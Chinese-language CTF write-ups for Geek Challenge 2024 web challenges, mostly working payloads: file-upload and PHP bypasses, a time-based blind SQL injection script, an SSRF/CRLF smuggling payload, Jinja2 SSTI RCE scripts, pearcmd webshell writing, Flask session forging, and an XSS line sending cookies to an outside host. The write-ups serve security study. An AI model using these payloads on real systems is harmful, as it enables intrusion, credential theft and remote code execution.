## 极客大挑战2024-baby_upload
可以先随便弄出来一个404界面，发现版本是apache/2.4.10，这个版本有一个CVE-2017-15715漏洞，因为不能直接上传php文件，可以上传抓包，用hex模块将php后的那个位改为`0a`,发现上传成功，然后访问1.php%0a,发现代码执行成功，再连接蚁剑，找到flag,或者可以将文件名改为1.1.php,干扰文件后缀检测，也可以成功，因为文件后端对后缀名的检测有问题，把第一个点后的所有内容都当成后缀命了，但是服务器解析时是把从后往前第一个点后的内容当成后缀，这样就绕过了。
## 极客大挑战2024-rce_me
第一层
```php
if (!is_array($_POST["start"])) {  
    if (!preg_match("/start.*now/is", $_POST["start"])) {  
        if (strpos($_POST["start"], "start now") === false) {  
            die("Well, you haven't started.<br>");  
        }  
    }  
}
```
start不能是数组，`.*`匹配任意字符，但后面的`/is`中i表示区分大小写，s表示**让 `.` 匹配换行符**（dotall）。默认情况下，正则中的 `.` 只能匹配除换行符（`\n`）之外的任意字符；加上 `s` 后，`.` 会匹配包括换行符在内的所有字符。并且不能有`start now`,但是逻辑是只要全满足就失败了，所以至少一个不满足，可以传数组，或者传`statr\nnow`,或者直接传start  now
第二层
```php
if (    sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL") &&  
    (string) $_POST["__2024.geekchallenge.ctf"] != "Geekchallenge2024_bmKtL" &&    is_numeric(intval($_POST["__2024.geekchallenge.ctf"]))  
) {  
    echo "You took the first step!<br>";
```
`__2024.geekchallenge.ctf`要sha1后与md5(Geekchallenge2024_bmKtL)相等，因为md5(Geekchallenge2024_bmKtL)以0e开头，可以用弱比较科学计数法绕过，并且还要是纯数字，找一个特殊例子`10932435112`,的sha1是以0e开头，成功绕过
第三层
```php
if (intval($year) < 2024 && intval($year + 1) > 2025) {  
        echo "Well, I know the year is 2024<br>";  
  
        if (preg_match("/.+?rce/ism", $purpose)) {  
            die("nonono");  
        }  
  
        if (stripos($purpose, "rce") === false) {  
            die("nonononono");  
        }  
        echo "Get the flag now!<br>";  
        eval($GLOBALS['code']);
```
可以用科学计数法绕过year=4e5,不能让下面两个if成立，- **`(.+?)`**：非贪婪匹配（尽可能少匹配字符），匹配 **至少 1 个任意字符**（`.` 匹配除换行外的字符，`+` 表示 1 次及以上，`?` 表示非贪婪）。可以`?purpose=rce`,rce前为空，绕过第一个，存在rce,绕过第二层，最后用`system=('cat /flag');`得到flag
## 极客大挑战2024-ez_http
按他说的来，`you must from https://www.sycsec.com`将referer改为`https://www.sycsec.com`就行有说要用本地ip,改x-forward-for为`127.0.0.1`但不行，需要改x-real-ip为127.0.0.1，然后按它提示在请求头里加一个`STARVEN`,value为他说的东西，cookie改为他说的内容，得到flag
## ⚪神启动
找源码，在`score==100`哪里用base64解码后就是flag,因为`atob()` 是 JavaScript 中的一个内置函数，用于将 **Base64 编码的字符串** 解码为原始的二进制字符串
## 极客大挑战2024-ezpop


## 极客大挑战2024-Problem_On_My_Web
有一个输入框，可以输入`<script>alert(1)</script>`出现弹窗，说明有xss漏洞，![](/image/140.png)可以外带一下cookie,`<script>fetch('https://fp45573k.requestrepo.com/?cookie='+document.cookie)</script>`用的那个网站延迟特别大，得多试几次才能成功。还有一种解法就是，可以试一下`<script>alert(114514)</script>`
然后访问管理员界面，输入`url=http://127.0.0.1`看到![](/image/141.png)alert的内容可以在这里显示，可以试一下cookie可不可以直接带到这里。`<script>alert(document.cookie)</script>`![](/image/142.png)也可以得到flag

## 极客大挑战2024-funnySQL
这道题无论输入什么都是没有回显，所以可以打时间盲注。但是还是有一点回显的，就是触发黑名单的时候。黑名单`sleep and or 空格 -- = `
- `and`->`&&`
- `or`->`||`
- `空格`->`/**/`
- `=`->`like`
- `--`被禁了可以用`#`注释,但是不可以直接用`#`,因为`#`在url里有特殊含义，浏览器解析 URL 时，`#`及其后面的内容**不会发送到服务器**，仅用于定位页面内锚点（比如`https://xxx.com/#footer`只会请求`https://xxx.com/`，`#footer`留给浏览器本地处理，所以这一题要用%23代替，`#`
- 可以用benchmark代替sleep,例如benchmark(1000000,sha1(1))可以把sha(1)这个表达式执行1000000次，通过消耗cpu资源实现延迟。
- 试一下`'||if(length((select/**/database()))>0,benchmark(1000000,sha1(1)),1)%23`可以延时，大概2秒
写一个脚本
```python
import requests  
import time  
  
url="http://80-24150bd5-fd2d-464d-b45d-79ea2c2cc082.challenge.ctfplus.cn/index.php?username="  
  
def check(payload):  
    start_time = time.time()  
    r = requests.get(url+payload)  
    end_time = time.time()  
    response_time = end_time - start_time  
    if response_time > 1.5:  
        return True  
    else:  
        return False  
  
chars="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&'()*+,-./:;<=>?@[\]^`{|}~"  
  
result=""  
  
for i in range(100):  
    for c in chars:  
        # '||if(substr((select/**/database()),{i},1)/**/like/**/'{c}',benchmark(1000000,sha1(1)),0)%23  
        # '||if((substr((select/**/table_name/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/'syclover'/**/limit/**/0,1),{i},1)/**/like/**/'{c}'),benchmark(10000000,sha1(1)),0)%23        
        # '||if((substr((select/**/*/**/from/**/Rea11ys3ccccccr3333t),{i},1)/**/like/**/'{c}'),benchmark(10000000,sha1(1)),0)%23        
        payload = f"'||if((substr((select/**/*/**/from/**/Rea11ys3ccccccr3333t),{i},1)/**/like/**/'{c}'),benchmark(10000000,sha1(1)),0)%23"  
        if check(payload):  
            result+=c  
            break  
    print(result)
```
得到flag
`mysql.innodb_table_stats`：MySQL 系统表，存储所有 InnoDB 引擎表的统计信息（含库名、表名），替代被禁用的`information_schema`时常用；因为or被过滤了
`limit 0 1`表示只输出第一个。
## 极客大挑战2024-ez_SSRF
扫目录发现`www.zip`文件备份，找到源码
h4d333333.php
```php
<?php
error_reporting(0);
if(!isset($_POST['user'])){
    $user="stranger";
}else{
    $user=$_POST['user'];//user默认值是stranger,可以被用户输入覆盖，无所谓
}
if (isset($_GET['location'])) {
    $location=$_GET['location'];
    //初始化SOAP客户端
    $client=new SoapClient(null,array(
        "location"=>$location,//get参数可控，SOAP服务的远程地址。
        "uri"=>"hahaha",//固定URI,SOAP服务的命名空间
        "login"=>"guest",//固定登录名
        "password"=>"gueeeeest!!!!",//固定密码
        "user_agent"=>$user."'s Chrome"));//拼接user到user-agent
    $client->calculator();//调用
    echo file_get_contents("result");//读取并输出当前目录下的result内容
}else{
    echo "Please give me a location";
}
```
calculator.php
```php
<?php
$admin="aaaaaaaaaaaadmin";
$adminpass="i_want_to_getI00_inMyT3st";
function check($auth) {
    global $admin,$adminpass;//引入全局的账号密码变量
    $auth = str_replace('Basic ', '', $auth);//移除basic认证头的Basic前缀
    $auth = base64_decode($auth);//对剩余部分base64解码
    list($username, $password) = explode(':', $auth);//按冒号分割解码后的字符串，得到用户名和密码。
    echo $username."<br>".$password;
    if($username===$admin && $password===$adminpass) {
        return 1;//匹配成功
    }else{
        return 2;//匹配失败
    }
}
if($_SERVER['REMOTE_ADDR']!=="127.0.0.1"){
    exit("Hacker");//限制只有本地访问
}
$expression = $_POST['expression'];
$auth=$_SERVER['HTTP_AUTHORIZATION'];//获取HTTP请求头中的Authorization字段
if(isset($auth)){
    if (check($auth)===2) {//认证失败
        if(!preg_match('/^[0-9+\-*\/]+$/', $expression)) {
            die("Invalid expression");
        }else{//符合规则就执行表达式，放到result文件
            $result=eval("return $expression;");
            file_put_contents("result",$result);
        }
    }else{//如果认证成功就执行表达式，放到result文件（没有任何限制）
        $result=eval("return $expression;");
        file_put_contents("result",$result);
    }
}else{
    exit("Hacker");
}
```
**SoapClient是什么**：`SoapClient` 是 PHP 的 SOAP 客户端类，用于调用远程 SOAP（简单对象访问协议）服务，核心参数说明：
- `null` 第一个参数是WSDL文件地址，传null表示‘非WSDL模式’（手动指定location和uri）
- `location` 远程SOAP服务的端点地址，（比如http://example.com）
- `uri` SOAP 服务的命名空间（用于标识服务的唯一标识）；
- `login/password` SOAP 服务的认证信息；
- `user_agent` 发起 SOAP 请求时的 User-Agent 请求头。
因为location参数可控，意味着攻击者可指定任意远程地址作为 SOAP 服务端点，明显存在SSRF.
并且可以利用HTTP请求走私rce
根据以上解析得到payload
```
user=le0n%0D%0AAUTHORIZATION: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0D%0AContent-Type: application/x-www-form-urlencoded%0D%0AContent-Length: 22%0D%0A%0D%0Aexpression=`cat /flag`
```
直接用`%0D%0A`代表换行符，或者用bp的显示不可见字符的功能，就可以写成这样![](/image/250.png)但是下面的`Content-Length`一定要计算准确，不然会被截断。
解释payload
- `user=Xin`这是随便写的。这个字段不重要
- `AUTHORIZATION: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0`这是要有的字段，就是`calculator.php`里的`$auth`并且他base64解码后是`aaaaaaaaaaaadmin:i_want_to_getI00_inMyT3st`这样认证成功，执行`expression`里的表达式，并把结果放到`result`里。
- `Content-Type: application/x-www-form-urlencoded`post请求必须要有的字段。
- `Content-Length: 17`用来截断取下面的post请求的body.
```
expression=`ls /`  #要执行的指令
```
- 其中请求头是`POST /h4d333333.php?location=http://127.0.0.1/calculator.php`因为只有用`if($_SERVER['REMOTE_ADDR']!=="127.0.0.1"){`本地回环地址访问`calculator.php`里的代码才会执行，并把结果写道result里
- 最后访问result![](/image/251.png)
## 极客大挑战2024-Can_you_Pass_Me
这一关发现`{{}}`被过滤了。可以用`{%%}`试着输入`{%if 2>1%}nihao{%endif%}`发现回显nihao,
很多关键词都被过滤了，用一个脚本找到os模块
```python
import requests  
url=input('请输入url链接:')  
for i in range(500):  
    data={"name":'{%'+f'print(""|attr("__cl""ass__")|attr("__ba""se__")|attr("__subc""lasses__")()|attr("__ge""titem__")({i}))'+'%}'}#name可能需要根据实际情况变更  
    try:  
        response=requests.post(url,data=data)  
        #print(response.text)  
        if response.status_code == 200:  
            if 'os' in response.text:  
                print(response.text)  
                print(i)  
    except:  
        pass
```
找到是140。
过滤了`[]`可以用`.pop(140)`,也就是`|attr('po''p')(140)`
payload
```
name={%print(''|attr('__cla''ss__')|attr('__ba''se__')|attr('__subcla''sses__')()|attr('po''p')(140)|attr('__in''it__')|attr('__glob''als__')|attr('po''p')('po''p''en')('env|ba''se64')|attr('re''ad')())%}
```
对输出过滤了，所以要编码一下。
```python
import requests  
def find_os():  
    for i in range(1,250):  
        payload='{%'+f'''print(''|attr("__c""lass__")|attr('__ba''se__')|attr('__subc''lasses__')()|attr("__ge""titem__")({i}))'''+'%}'  
        datas = {"name":payload}  
        res = requests.post('http://80-b5763d4d-7e18-46b2-8b95-1e5888f39ad7.challenge.ctfplus.cn/submit', data=datas)  
        if 'os' in res.text:  
            print(res.text)  
            print(i)  
def rce():  
    rce = input(":")  
    payload = '{%' +f'''print(''|attr("__c""lass__")|attr('__ba''se__')|attr('__subc''lasses__')()|attr("__ge""titem__")(140)|attr("__in""it__")|attr("__glo""bals__")|attr("__ge""titem__")("__bui""ltins__")|attr("__ge""titem__")('eval')('__import__("o""s")')|attr("pop""en")("{rce}")|attr("re""ad")())''' + '%}'  
    datas = {"name": payload}  
    reset=requests.post('http://80-b5763d4d-7e18-46b2-8b95-1e5888f39ad7.challenge.ctfplus.cn/submit', data=datas)  
    print(reset.text)  
rce()
```
也就是`env|base64`输出后解码。
## ez_include
```php
<?php  
highlight_file(__FILE__);  
require_once 'starven_secret.php';  
if(isset($_GET['file'])) {  
    if(preg_match('/starven_secret.php/i', $_GET['file'])) {  
        require_once $_GET['file'];  
    }else{  
        echo "还想非预期?";  
    }  
}
```
明显是要绕过`require_once`的限制
```
?file=php://filter/read=convert.base64-encode/resource=_secret.php
```
这样可以读取到源码，解码后是
```php
<?php
$secret = "congratulation! you can goto /levelllll2.php to capture the flag!";
?>
```
但是当我想读取`/levelllll2.php`时有限制`f(preg_match('/starven_secret.php/i', $_GET['file']))`用户输入必须包含`starven_secret.php`
直接访问`/levelllll2.php`
源码
```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
if (isset($_GET ["syc"])){    
	$file = $_GET ["syc"];    
	$hint = "register_argc_argv = On";  
    if (preg_match("/config|create|filter|download|phar|log|sess|-c|-d|%|data/i", $file)) {  
        die("hint都给的这么明显了还不会做?");  
    }  
    if(substr($_SERVER['REQUEST_URI'], -4) === '.php'){  
        include $file;  
    }  
}
```
看到`$hint = "register_argc_argv = On";`所以可以用pearcmd![](/image/252.png)可以看到是创建成功了。
payload
```
?syc=/usr/local/lib/php/pearcmd.php&pear+config-create+/<?=@eval($_POST['cmd']);?>+/tmp/hell5.php
```
再
```
?syc=/tmp/hell5.php
```
就可以getshell
我看payload还有一种方法。
```
GET /levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&+install+--installroot=/var/www/html+http://xn--vqqq8jxym.store/shell.php
```
就是在自己的服务器网页根目录写一个木马文件，用pearcmd的下载功能下载到题目环境。下载到了`/tmp/pear/download/shell.php`访问![](/image/253.png)
就可以getshell。
还有一个非预期解。
就是直接在第一个界面
直接
```
?file=/starven_secret.php/../etc/passwd
```
可以实现任意文件读取。
## py_game
首先随便注册一个账号，找到cookie里的session，这里就需要用到弱密钥爆破，直接用工具爆，
```
flask-unsign --unsign --cookie "eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiNjc3NyJ9.aWNfKA.Os1ElFA7TwCB_7jyvo3HWA4LNTE"
```
![](/image/255.png)密钥是`a123456`
接着就是伪造身份。
```
flask-unsign --sign --cookie "{'_flashes': [('success', '登录成功')], 'username':'admin'}" --secret 'a123456'
```
![](/image/256.png)
直接把session替换为伪造的就可以得到admin权限。
下载源码app.pyc
找个pyc反编译网站可以直接拿到源码[网站](https://www.lddgo.net/string/pyc-compile-decompile)
```python
# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
# Version : Python 3.6

import json
from lxml import etree
from flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify
app = Flask(__name__)
app.secret_key = 'a123456'
app.config['xml_data'] = '<?xml version="1.0" encoding="UTF-8"?><GeekChallenge2024><EventName>Geek Challenge</EventName><Year>2024</Year><Description>This is a challenge event for geeks in the year 2024.</Description></GeekChallenge2024>'

class User:
    
    def __init__(self, username, password):
        self.username = username
        self.password = password

    
    def check(self, data):
        if self.username == data['username']:
            pass
        return self.password == data['password']


admin = User('admin', '123456j1rrynonono')
Users = [
    admin]

def update(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and isinstance(v, dict):
                update(v, dst.get(k))
            else:
                dst[k] = v
        if hasattr(dst, k) and isinstance(v, dict):
            update(v, getattr(dst, k))
            continue
        setattr(dst, k, v)
    


def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        for u in Users:
            if u.username == username:
                flash('用户名已存在', 'error')
                return redirect(url_for('register'))
        
        new_user = User(username, password)
        Users.append(new_user)
        flash('注册成功！请登录', 'success')
        return redirect(url_for('login'))
    return None('register.html')

register = app.route('/register', [
    'GET',
    'POST'], **('methods',))(register)

def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        for u in Users:
            if u.check({
                'username': username,
                'password': password }):
                session['username'] = username
                flash('登录成功', 'success')
                return redirect(url_for('dashboard'))
        
        flash('用户名或密码错误', 'error')
        return redirect(url_for('login'))
    return None('login.html')

login = app.route('/login', [
    'GET',
    'POST'], **('methods',))(login)

def play():
    pass
# WARNING: Decompyle incomplete

play = app.route('/play', [
    'GET',
    'POST'], **('methods',))(play)

def admin():
    if 'username' in session and session['username'] == 'admin':
        return render_template('admin.html', session['username'], **('username',))
    None('你没有权限访问', 'error')
    return redirect(url_for('login'))

admin = app.route('/admin', [
    'GET',
    'POST'], **('methods',))(admin)

def downloads321():
    return send_file('./source/app.pyc', True, **('as_attachment',))

downloads321 = app.route('/downloads321')(downloads321)

def index():
    return render_template('index.html')

index = app.route('/')(index)

def dashboard():
    if 'username' in session:
        is_admin = session['username'] == 'admin'
        if is_admin:
            user_tag = 'Admin User'
        else:
            user_tag = 'Normal User'
        return render_template('dashboard.html', session['username'], user_tag, is_admin, **('username', 'tag', 'is_admin'))
    None('请先登录', 'error')
    return redirect(url_for('login'))

dashboard = app.route('/dashboard')(dashboard)

def xml_parse():
    
    try:
        xml_bytes = app.config['xml_data'].encode('utf-8')
        parser = etree.XMLParser(True, True, **('load_dtd', 'resolve_entities'))
        tree = etree.fromstring(xml_bytes, parser, **('parser',))
        result_xml = etree.tostring(tree, True, 'utf-8', True, **('pretty_print', 'encoding', 'xml_declaration'))
        return Response(result_xml, 'application/xml', **('mimetype',))
        except etree.XMLSyntaxError:
            e = None
            
            try:
                return str(e)
                e = None
                del e
            return None



xml_parse = app.route('/xml_parse')(xml_parse)
black_list = [
    '__class__'.encode(),
    '__init__'.encode(),
    '__globals__'.encode()]

def check(data):
    print(data)
    for i in black_list:
        print(i)
        if i in data:
            print(i)
            return False
    
    return True


def update_route():
    if 'username' in session and session['username'] == 'admin':
        if request.data:
            
            try:
                if not check(request.data):
                    return ('NONONO, Bad Hacker', 403)
                data = None.loads(request.data.decode())
                print(data)
                if all((lambda .0: pass)(data.values())):
                    update(data, User)
                    return (jsonify({
                        'message': '更新成功' }), 200)
                return None
            except Exception:
                e = None
                
                try:
                    return (f'''Exception: {str(e)}''', 500)
                    e = None
                    del e
                return ('No data provided', 400)
                return redirect(url_for('login'))
                return None



update_route = app.route('/update', [
    'POST'], **('methods',))(update_route)
if __name__ == '__main__':
    app.run('0.0.0.0', 80, False, **('host', 'port', 'debug'))

```